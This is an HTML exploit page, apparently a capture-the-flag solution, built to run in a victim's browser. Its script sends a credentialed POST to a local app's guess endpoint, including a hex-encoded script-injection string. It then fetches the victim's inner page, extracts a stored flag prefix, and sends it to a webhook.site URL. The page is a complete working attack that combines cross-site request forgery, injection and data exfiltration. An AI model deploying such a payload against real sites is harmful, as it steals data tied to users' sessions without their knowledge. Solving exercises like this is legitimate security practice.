<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Auto Guess Payload</title>
</head>
<body>
  <h2>Auto Guess Payload Running...</h2>
  <script>
(async () => {
  await fetch("http://127.0.0.1:5000/guess", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      guess: "NHNC{",
      note: "3c7363726970743e616c657274282768656c6c6f27293c2f7363726970743e"
    })
  });

  // Fetch inner.html để lấy thông tin đã lưu
  const res = await fetch("http://127.0.0.1:5000/inner.html", { credentials: "include" });
  const html = await res.text();
  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];

  // Gửi về webhook
  await fetch("https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?leak=" + encodeURIComponent(prefix));
})();
</script>
</body>
</html>
